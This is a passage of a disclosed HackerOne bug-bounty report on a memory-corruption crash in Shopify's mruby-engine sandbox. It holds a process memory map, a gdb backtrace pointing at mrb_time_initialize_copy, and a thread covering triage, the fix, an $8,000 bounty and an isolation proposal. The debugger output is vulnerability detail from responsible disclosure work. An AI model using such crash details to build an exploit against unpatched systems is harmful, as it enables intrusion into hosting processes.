00000000 08:03 948522                     /usr/lib/ruby/2.3.0/x86_64-linux/digest/sha1.so\n7f511a333000-7f511a334000 rw-p 00001000 08:03 948522                     /usr/lib/ruby/2.3.0/x86_64-linux/digest/sha1.so\n7f511a334000-7f511a335000 r-xp 00000000 08:03 948520                     /usr/lib/ruby/2.3.0/x86_64-linux/io/nonblock.so\n7f511a335000-7f511a535000 ---p 00001000 08:03 948520                     /usr/lib/ruby/2.3.0/x86_64-linux/io/nonblock.so\n7f511a535000-7f511a536000 r--p 00001000 08:03 948520                     /usr/lib/ruby/2.3.0/x86_64-linux/io/nonblock.so\n7f511a536000-7f511a537000 rw-p 00002000 08:03 948520                     /usr/lib/ruby/2.3.0/x86_64-linux/io/nonblock.so\n7f511a537000-7f511a53a000 r-xp 00000000 08:03 948451                     /usr/lib/ruby/2.3.0/x86_64-linux/digest.so\n7f511a53a000-7f511a739000 ---p 00003000 08:03 948451                     /usr/lib/ruby/2.3.0/x86_64-linux/digest.so\n7f511a739000-7f511a73a000 r--p 00002000 08:03 948451                     /usr/lib/ruby/2.3.0/x86_64-linux/digest.so\n7f511a73a000-7f511a73b000 rw-p 00003000 08:03 948451                     /usr/lib/ruby/2.3.0/x86_64-linux/digest.so\n7f511a73b000-7f511a989000 r-xp 00000000 08:03 935797                     /usr/lib/libcrypto.so.1.0.0\n7f511a989000-7f511ab88000 ---p 0024e000 08:03 935797                     /usr/lib/libcrypto.so.1.0.0\n7f511ab88000-7f511aba4000 r--p 0024d000 08:03 935797                     /usr/lib/libcrypto.so.1.0.0\n7f511aba4000-7f511abb0000 rw-p 00269000 08:03 935797                     /usr/lib/libcrypto.so.1.0.0\n7f511abb0000-7f511abb3000 rw-p 00000000 00:00 0 \n7f511abb3000-7f511ac1a000 r-xp 00000000 08:03 935796                     /usr/lib/libssl.so.1.0.0\n7f511ac1a000-7f511ae19000 ---p 00067000 08:03 935796                     /usr/lib/libssl.so.1.0.0\n7f511ae19000-7f511ae1d000 r--p 00066000 08:03 935796                     /usr/lib/libssl.so.1.0.0\n7f511ae1d000-7f511ae24000 rw-p 0006a000 08:03 935796                     /usr/lib/libssl.so.1.0.0\n7f511ae24000-7f511ae73000 r-xp 00000000 08:03 948466                     /usr/lib/ruby/2.3.0/x86_64-linux/openssl.so\n7f511ae73000-7f511b073000 ---p 0004f000 08:03 948466                     /usr/lib/ruby/2.3.0/x86_64-linux/openssl.so\n7f511b073000-7f511b075000 r--p 0004f000 08:03 948466                     /usr/lib/ruby/2.3.0/x86_64-linux/openssl.so\n7f511b075000-7f511b077000 rw-p 00051000 08:03 948466                     /usr/lib/ruby/2.3.0/x86_64-linux/openssl.so\n7f511b077000-7f511b078000 rw-p 00000000 00:00 0 \n7f511b078000-7f511b079000 r-xp 00000000 08:03 948518                     /usr/lib/ruby/2.3.0/x86_64-linux/cgi/escape.so\n7f511b079000-7f511b279000 ---p 00001000 08:03 948518                     /usr/lib/ruby/2.3.0/x86_64-linux/cgi/escape.so\n7f511b279000-7f511b27a000 r--p 00001000 08:03 948518                     /usr/lib/ruby/2.3.0/x86_64-linux/cgi/escape.so\n7f511b27a000-7f511b27b000 rw-p 00002000 08:03 948518                     /usr/lib/ruby/2.3.0/x86_64-linux/cgi/escape.so\n7f511b27b000-7f511b2aa000 r-xp 00000000 08:03 948449                     /usr/lib/ruby/2.3.0/x86_64-linux/date_core.so\n7f511b2aa000-7f511b4aa000 ---p 0002f000 08:03 948449                     /usr/lib/ruby/2.3.0/x86_64-linux/date_core.so\n7f511b4aa000-7f511b4ab000 r--p 0002f000 08:03 948449                     /usr/lib/ruby/2.3.0/x86_64-linux/date_core.so\n7f511b4ab000-7f511b4ac000 rw-p 00030000 08:03 948449                     /usr/lib/ruby/2.3.0/x86_64-linux/date_core.so\n7f511b4ac000-7f511b4ad000 rw-p 00000000 00:00 0 \n7f511b4ad000-7f511b4b0000 r-xp 00000000 08:03 948497                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/windows_31j.so\n7f511b4b0000-7f511b6af000 ---p 00003000 08:03 948497                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/windows_31j.so\n7f511b6af000-7f511b6b0000 r--p 00002000 08:03 948497                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/windows_31j.so\n7f511b6b0000-7f511b6b1000 rw-p 00003000 08:03 948497                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/windows_31j.so\n7f511b6b1000-7f511b6c6000 r-xp 00000000 08:03 935844                     /usr/lib/libz.so.1.2.8\n7f511b6c6000-7f511b8c5000 ---p 00015000 08:03 935844                     /usr/lib/libz.so.1.2.8\n7f511b8c5000-7f511b8c6000 r--p 00014000 08:03 935844                     /usr/lib/libz.so.1.2.8\n7f511b8c6000-7f511b8c7000 rw-p 00015000 08:03 935844                     /usr/lib/libz.so.1.2.8\n7f511b8c7000-7f511b8d4000 r-xp 00000000 08:03 948478                     /usr/lib/ruby/2.3.0/x86_64-linux/zlib.so\n7f511b8d4000-7f511bad3000 ---p 0000d000 08:03 948478                     /usr/lib/ruby/2.3.0/x86_64-linux/zlib.so\n7f511bad3000-7f511bad4000 r--p 0000c000 08:03 948478                     /usr/lib/ruby/2.3.0/x86_64-linux/zlib.so\n7f511bad4000-7f511bad5000 rw-p 0000d000 08:03 948478                     /usr/lib/ruby/2.3.0/x86_64-linux/zlib.so\n7f511bad5000-7f511bad7000 r-xp 00000000 08:03 948519                     /usr/lib/ruby/2.3.0/x86_64-linux/io/wait.so\n7f511bad7000-7f511bcd6000 ---p 00002000 08:03 948519                     /usr/lib/ruby/2.3.0/x86_64-linux/io/wait.so\n7f511bcd6000-7f511bcd7000 r--p 00001000 08:03 948519                     /usr/lib/ruby/2.3.0/x86_64-linux/io/wait.so\n7f511bcd7000-7f511bcd8000 rw-p 00002000 08:03 948519                     /usr/lib/ruby/2.3.0/x86_64-linux/io/wait.so\n7f511bcd8000-7f511bd02000 r-xp 00000000 08:03 948453                     /usr/lib/ruby/2.3.0/x86_64-linux/socket.so\n7f511bd02000-7f511bf01000 ---p 0002a000 08:03 948453                     /usr/lib/ruby/2.3.0/x86_64-linux/socket.so\n7f511bf01000-7f511bf02000 r--p 00029000 08:03 948453                     /usr/lib/ruby/2.3.0/x86_64-linux/socket.so\n7f511bf02000-7f511bf03000 rw-p 0002a000 08:03 948453                     /usr/lib/ruby/2.3.0/x86_64-linux/socket.so\n7f511bf03000-7f511bf09000 r-xp 00000000 08:03 948456                     /usr/lib/ruby/2.3.0/x86_64-linux/etc.so\n7f511bf09000-7f511c108000 ---p 00006000 08:03 948456                     /usr/lib/ruby/2.3.0/x86_64-linux/etc.so\n7f511c108000-7f511c109000 r--p 00005000 08:03 948456                     /usr/lib/ruby/2.3.0/x86_64-linux/etc.so\n7f511c109000-7f511c10a000 rw-p 00006000 08:03 948456                     /usr/lib/ruby/2.3.0/x86_64-linux/etc.so\n7f511c10a000-7f511c10e000 r-xp 00000000 08:03 948521                     /usr/lib/ruby/2.3.0/x86_64-linux/io/console.so\n7f511c10e000-7f511c30d000 ---p 00004000 08:03 948521                     /usr/lib/ruby/2.3.0/x86_64-linux/io/console.so\n7f511c30d000-7f511c30e000 r--p 00003000 08:03 948521                     /usr/lib/ruby/2.3.0/x86_64-linux/io/console.so\n7f511c30e000-7f511c30f000 rw-p 00004000 08:03 948521                     /usr/lib/ruby/2.3.0/x86_64-linux/io/console.so\n7f511c30f000-7f511c315000 r-xp 00000000 08:03 948469                     /usr/lib/ruby/2.3.0/x86_64-linux/pathname.so\n7f511c315000-7f511c514000 ---p 00006000 08:03 948469                     /usr/lib/ruby/2.3.0/x86_64-linux/pathname.so\n7f511c514000-7f511c515000 r--p 00005000 08:03 948469                     /usr/lib/ruby/2.3.0/x86_64-linux/pathname.so\n7f511c515000-7f511c516000 rw-p 00006000 08:03 948469                     /usr/lib/ruby/2.3.0/x86_64-linux/pathname.so\n7f511c516000-7f511c51d000 r-xp 00000000 08:03 948454                     /usr/lib/ruby/2.3.0/x86_64-linux/stringio.so\n7f511c51d000-7f511c71c000 ---p 00007000 08:03 948454                     /usr/lib/ruby/2.3.0/x86_64-linux/stringio.so\n7f511c71c000-7f511c71d000 r--p 00006000 08:03 948454                     /usr/lib/ruby/2.3.0/x86_64-linux/stringio.so\n7f511c71d000-7f511c71e000 rw-p 00007000 08:03 948454                     /usr/lib/ruby/2.3.0/x86_64-linux/stringio.so\n7f511c71e000-7f511c720000 r-xp 00000000 08:03 1061025                    /usr/lib/ruby/2.3.0/x86_64-linux/enc/trans/transdb.so\n7f511c720000-7f511c920000 ---p 00002000 08:03 1061025                    /usr/lib/ruby/2.3.0/x86_64-linux/enc/trans/transdb.so\n7f511c920000-7f511c921000 r--p 00002000 08:03 1061025                    /usr/lib/ruby/2.3.0/x86_64-linux/enc/trans/transdb.so\n7f511c921000-7f511c922000 rw-p 00003000 08:03 1061025                    /usr/lib/ruby/2.3.0/x86_64-linux/enc/trans/transdb.so\n7f511c922000-7f511c924000 r-xp 00000000 08:03 948511                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/encdb.so\n7f511c924000-7f511cb23000 ---p 00002000 08:03 948511                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/encdb.so\n7f511cb23000-7f511cb24000 r--p 00001000 08:03 948511                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/encdb.so\n7f511cb24000-7f511cb25000 rw-p 00002000 08:03 948511                     /usr/lib/ruby/2.3.0/x86_64-linux/enc/encdb.so\n7f511cb25000-7f511cc26000 rw-p 00000000 00:00 0 \n7f511cc26000-7f511cd29000 r-xp 00000000 08:03 935421                     /usr/lib/libm-2.24.so\n7f511cd29000-7f511cf28000 ---p 00103000 08:03 935421                     /usr/lib/libm-2.24.so\n7f511cf28000-7f511cf29000 r--p 00102000 08:03 935421                     /usr/lib/libm-2.24.so\n7f511cf29000-7f511cf2a000 rw-p 00103000 08:03 935421                     /usr/lib/libm-2.24.so\n7f511cf2a000-7f511cf32000 r-xp 00000000 08:03 935412                     /usr/lib/libcrypt-2.24.so\n7f511cf32000-7f511d132000 ---p 00008000 08:03 935412                     /usr/lib/libcrypt-2.24.so\n7f511d132000-7f511d133000 r--p 00008000 08:03 935412                     /usr/lib/libcrypt-2.24.so\n7f511d133000-7f511d134000 rw-p 00009000 08:03 935412                     /usr/lib/libcrypt-2.24.so\n7f511d134000-7f511d162000 rw-p 00000000 00:00 0 \n7f511d162000-7f511d164000 r-xp 00000000 08:03 935420                     /usr/lib/libdl-2.24.so\n7f511d164000-7f511d364000 ---p 00002000 08:03 935420                     /usr/lib/libdl-2.24.so\n7f511d364000-7f511d365000 r--p 00002000 08:03 935420                     /usr/lib/libdl-2.24.so\n7f511d365000-7f511d366000 rw-p 00003000 08:03 935420                     /usr/lib/libdl-2.24.so\n7f511d366000-7f511d3f8000 r-xp 00000000 08:03 935607                     /usr/lib/libgmp.so.10.3.1\n7f511d3f8000-7f511d5f7000 ---p 00092000 08:03 935607                     /usr/lib/libgmp.so.10.3.1\n7f511d5f7000-7f511d5f8000 r--p 00091000 08:03 935607                     /usr/lib/libgmp.so.10.3.1\n7f511d5f8000-7f511d5f9000 rw-p 00092000 08:03 935607                     /usr/lib/libgmp.so.10.3.1\n7f511d5f9000-7f511d611000 r-xp 00000000 08:03 934933                     /usr/lib/libpthread-2.24.so\n7f511d611000-7f511d810000 ---p 00018000 08:03 934933                     /usr/lib/libpthread-2.24.so\n7f511d810000-7f511d811000 r--p 00017000 08:03 934933                     /usr/lib/libpthread-2.24.so\n7f511d811000-7f511d812000 rw-p 00018000 08:03 934933                     /usr/lib/libpthread-2.24.so\n7f511d812000-7f511d816000 rw-p 00000000 00:00 0 \n7f511d816000-7f511d9ab000 r-xp 00000000 08:03 934952                     /usr/lib/libc-2.24.so\n7f511d9ab000-7f511dbaa000 ---p 00195000 08:03 934952                     /usr/lib/libc-2.24.so\n7f511dbaa000-7f511dbae000 r--p 00194000 08:03 934952                     /usr/lib/libc-2.24.so\n7f511dbae000-7f511dbb0000 rw-p 00198000 08:03 934952                     /usr/lib/libc-2.24.so\n7f511dbb0000-7f511dbb4000 rw-p 00000000 00:00 0 \n7f511dbb4000-7f511de28000 r-xp 00000000 08:03 936071                     /usr/lib/libruby.so.2.3.0\n7f511de28000-7f511e027000 ---p 00274000 08:03 936071                     /usr/lib/libruby.so.2.3.0\n7f511e027000-7f511e02d000 r--p 00273000 08:03 936071                     /usr/lib/libruby.so.2.3.0\n7f511e02d000-7f511e030000 rw-p 00279000 08:03 936071                     /usr/lib/libruby.so.2.3.0\n7f511e030000-7f511e041000 rw-p 00000000 00:00 0 \n7f511e041000-7f511e064000 r-xp 00000000 08:03 934951                     /usr/lib/ld-2.24.so\n7f511e0b5000-7f511e24d000 r--p 00000000 08:03 934978                     /usr/lib/locale/locale-archive\n7f511e24d000-7f511e253000 rw-p 00000000 00:00 0 \n7f511e25d000-7f511e25f000 r--s 00000000 08:03 948906                     /usr/bin/ruby\n7f511e25f000-7f511e260000 ---p 00000000 00:00 0 \n7f511e260000-7f511e263000 rw-p 00000000 00:00 0 \n7f511e263000-7f511e264000 r--p 00022000 08:03 934951                     /usr/lib/ld-2.24.so\n7f511e264000-7f511e265000 rw-p 00023000 08:03 934951                     /usr/lib/ld-2.24.so\n7f511e265000-7f511e266000 rw-p 00000000 00:00 0 \n7ffd41d4f000-7ffd4254e000 rw-p 00000000 00:00 0                          [stack]\n7ffd425b8000-7ffd425ba000 r--p 00000000 00:00 0                          [vvar]\n7ffd425ba000-7ffd425bc000 r-xp 00000000 00:00 0                          [vdso]\nffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]\n\n\n[NOTE]\nYou may have encountered a bug in the Ruby interpreter or extension libraries.\nBug reports are welcome.\nFor details: http://www.ruby-lang.org/bugreport.html\n\n[1]    13900 abort (core dumped)  bin/sandbox /tmp/test.mrb\n```\n\n```\n$gdb attach 13803\nGNU gdb (GDB) 7.12\nCopyright (C) 2016 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later \u003chttp://gnu.org/licenses/gpl.html\u003e\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.  Type \"show copying\"\nand \"show warranty\" for details.\nThis GDB was configured as \"x86_64-pc-linux-gnu\".\nType \"show configuration\" for configuration details.\nFor bug reporting instructions, please see:\n\u003chttp://www.gnu.org/software/gdb/bugs/\u003e.\nFind the GDB manual and other documentation resources online at:\n\u003chttp://www.gnu.org/software/gdb/documentation/\u003e.\nFor help, type \"help\".\nType \"apropos word\" to search for commands related to \"word\"...\nattach: No such file or directory.\nAttaching to process 13803\n[New LWP 13804]\n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library \"/usr/lib/libthread_db.so.1\".\n0x00007f72ba6144b8 in pthread_cond_timedwait@@GLIBC_2.3.2 () from /usr/lib/libpthread.so.0\n(gdb) bt\n#0  0x00007f72ba6144b8 in pthread_cond_timedwait@@GLIBC_2.3.2 () from /usr/lib/libpthread.so.0\n#1  0x00007f72bad5ccae in ?? () from /usr/lib/libruby.so.2.3\n#2  0x00007f72bad5de93 in ?? () from /usr/lib/libruby.so.2.3\n#3  0x00007f72bad62c96 in ?? () from /usr/lib/libruby.so.2.3\n#4  0x00007f72baca5720 in ?? () from /usr/lib/libruby.so.2.3\n#5  0x00007f72bad408b5 in ?? () from /usr/lib/libruby.so.2.3\n#6  0x00007f72bad53093 in ?? () from /usr/lib/libruby.so.2.3\n#7  0x00007f72bad540e3 in ?? () from /usr/lib/libruby.so.2.3\n#8  0x00007f72bad48a58 in ?? () from /usr/lib/libruby.so.2.3\n#9  0x00007f72bad4daef in ?? () from /usr/lib/libruby.so.2.3\n#10 0x00007f72bac354dd in ?? () from /usr/lib/libruby.so.2.3\n#11 0x00007f72bac36e2d in ruby_exec_node () from /usr/lib/libruby.so.2.3\n#12 0x00007f72bac38f2e in ruby_run_node () from /usr/lib/libruby.so.2.3\n#13 0x00000000004007cb in ?? ()\n#14 0x00007f72ba844291 in __libc_start_main () from /usr/lib/libc.so.6\n#15 0x00000000004007fa in _start ()\n(gdb) c\nContinuing.\n[New Thread 0x7f72b57fe700 (LWP 13867)]\n\nThread 3 \"ruby\" received signal SIGSEGV, Segmentation fault.\n[Switching to Thread 0x7f72b57fe700 (LWP 13867)]\n0x00007f72b6cc85d3 in mrb_time_initialize_copy (mrb=0x7f72b57ff4e0, copy=...)\n    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby-time/src/time.c:533\n533\t  *(struct mrb_time *)DATA_PTR(copy) = *(struct mrb_time *)DATA_PTR(src);\n(gdb) bt\n#0  0x00007f72b6cc85d3 in mrb_time_initialize_copy (mrb=0x7f72b57ff4e0, copy=...)\n    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby-time/src/time.c:533\n#1  0x00007f72b6c87dbf in mrb_vm_exec (mrb=mrb@entry=0x7f72b57ff4e0, proc=\u003coptimized out\u003e, proc@entry=0x7f72b5807580, pc=\u003coptimized out\u003e)\n    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1165\n#2  0x00007f72b6c8d607 in mrb_vm_run (mrb=0x7f72b57ff4e0, proc=0x7f72b5807580, self=..., stack_keep=stack_keep@entry=0)\n    at /home/simon/git/shopify/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766\n#3  0x00007f72b6c6e613 in mruby_engine_monitored_eval (data=0x7f72b57ff3e0) at ../../../../ext/mruby_engine/eval_monitored.c:68\n#4  0x00007f72ba60e454 in start_thread () from /usr/lib/libpthread.so.0\n#5  0x00007f72ba90c7df in clone () from /usr/lib/libc.so.6\n(gdb) info registers\nrax            0x7f72b58224a0\t140130648204448\nrbx            0x7f72b58074f0\t140130648093936\nrcx            0x0\t0\nrdx            0x0\t0\nrsi            0x7f72b6f37c10\t140130672409616\nrdi            0x55504410\t1431323664\nrbp            0x7f72b57ff4e0\t0x7f72b57ff4e0\nrsp            0x7f72b57fdab0\t0x7f72b57fdab0\nr8             0x7f72b58074c0\t140130648093888\nr9             0x1\t1\nr10            0x177\t375\nr11            0x7f72b6cbef60\t140130669817696\nr12            0x7f72b58074f0\t140130648093936\nr13            0x4d\t77\nr14            0x7f72b57ff4e0\t140130648061152\nr15            0x7f72b57fff60\t140130648063840\nrip            0x7f72b6cc85d3\t0x7f72b6cc85d3 \u003cmrb_time_initialize_copy+115\u003e\neflags         0x10246\t[ PF ZF IF RF ]\ncs             0x33\t51\nss             0x2b\t43\nds             0x0\t0\nes             0x0\t0\nfs             0x0\t0\ngs             0x0\t0\n(gdb) quit\nA debugging session is active.\n\n\tInferior 1 [process 13803] will be detached.\n\nQuit anyway? (y or n) y\nDetaching from program: /usr/bin/ruby, process 13803\n```","bounty_amount":"8000.0","formatted_bounty":"$8,000","weakness":{"id":2,"name":"Memory Corruption - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-01-15T20:20:38.513Z","allow_singular_disclosure_after":-149448917.5519733,"singular_disclosure_allowed":true,"vote_count":3,"voters":["eveeez","linkks","spetr0x"],"severity":{"rating":"high","author_type":"User"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1316536,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Unrelated comment on the architecture of mruby-engine:\n\nI've been thinking about the design of mruby-engine the last couple days and to me it seems to be far more risky than it has to be. Mruby is currently embedded into the hosting ruby process, so every single crash or RCE bug will lead to access to the hosting process.\n\nThere was probably some good reasoning from your side behind it, but have you ever considered moving the mruby part into its own, isolated process (maybe even machine?). For me Linux containers were the first idea of isolation - paired with seccomp and proper namespace isolation the blast radius of RCEs could be minimized, even on the same host (well, technically one could still try to exploit the remaining syscalls or other flaws, but there's always something which could break regardless how much care one has taken, right?)\n\nPassing down the scripts via a lightweight socket protocol (might be protobuf or similar) the execution time probably wouldn't get a huge bump. One could reduce execution time even more by using some kind of forking server mechanism where the mruby engine is already initialized (drawback: ASLR wouldn't be there to help, also multi tenancy will be an issue as well).\n\nPosting this below this bug is not really the right place to do so, but I couldn't think of another contact method right now.","automated_response":false,"created_at":"2016-11-23T22:37:05.686Z","updated_at":"2016-11-23T22:37:05.686Z","actor":{"username":"brakhane","cleared":false,"url":"/brakhane","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/726/4b47d99eec4ee906a402afb934855158d1e6d929_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1316588,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you for your report. We've reproduced the issue, and our engineering team is investigating.\n\nBy the way, we're already in the process of modifying mruby-engine to execute MRuby in an isolated process. We'll make the details available once the change is in place.","automated_response":false,"created_at":"2016-11-23T23:34:19.290Z","updated_at":"2016-11-23T23:34:19.290Z","actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1317254,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Awesome, looking forward to the new design!\n\nI was about to create a patch this morning (had to get some sleep after submitting the report yesterday) and realized that Matz already commited https://github.com/mruby/mruby/commit/23c73ff3998782f5e2a7f1f3755fddf8ceed0d30 some hours ago.\n\nWhile it's good to see that things get patched very fast (that was really pretty fast, good job!), I would have loved to provide a patch myself, but I guess I can't follow the 'provide a patch' rule of your program anymore - damn you sleep ;)\n\nNonetheless it's still awesome that this is already fixed!","automated_response":false,"created_at":"2016-11-24T09:21:27.141Z","updated_at":"2016-11-24T09:21:27.141Z","actor":{"username":"brakhane","cleared":false,"url":"/brakhane","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/726/4b47d99eec4ee906a402afb934855158d1e6d929_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1319949,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks again for reporting this issue @brakhane. We've shipped a fix to our production environment.\n\nI'm marking this issue as resolved now but we still need to assess the impact \u0026 determine a final bounty amount. This may take a few weeks since we received a large number of valid issues and we want to calibrate our payouts across all of them.","automated_response":false,"created_at":"2016-11-25T21:43:10.616Z","updated_at":"2016-11-25T21:43:10.616Z","actor":{"username":"francoischagnon","cleared":false,"url":"/francoischagnon","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/168/5d577fe97283a5483331257b629b6287ed4d287b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"brakhane","url":"/brakhane"},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1370156,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Thanks for helping improve the security of Shopify Scripts and the mruby project!","automated_response":false,"created_at":"2016-12-16T20:20:30.340Z","updated_at":"2016-12-16T20:20:30.340Z","actor":{"url":"/shopify-scripts","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/015/668/ebbe467de8ef2fc936053593e1289e30f04c3b06_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"shopify-scripts"}},"bounty_amount":"8000.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"shopify-scripts","collaborator":{"username":"brakhane","url":"/brakhane"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1370158,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-12-16T20:20:38.482Z","updated_at":"2016-12-16T20:20:38.482Z","first_to_agree":true,"actor":{"username":"andrewdunbar","cleared":false,"url":"/andrewdunbar","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/164/5b0e89675ed6dbb9df87223e9f8f58e2125bb56b_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1370175,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the awesome bounty and the fun! Always a pleasure!","automated_response":false,"created_at":"2016-12-16T20:25:20.405Z","updated_at":"2016-12-16T20:25:20.405Z","actor":{"username":"brakhane","cleared":false,"url":"/brakhane","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/726/4b47d99eec4ee906a402afb934855158d1e6d929_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1370414,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2016-12-16T22:19:43.181Z","updated_at":"2016-12-16T22:19:43.181Z","actor":{"username":"brakhane","cleared":false,"url":"/brakhane","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/726/4b47d99eec4ee906a402afb934855158d1e6d929_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1370415,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2016-12-16T22:19:43.258Z","updated_at":"2016-12-16T22:19:43.258Z","actor":{"username":"brakhane","cleared":false,"url":"/brakhane","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/726/4b47d99eec4ee906a402afb934855158d1e6d929_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify-scripts","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}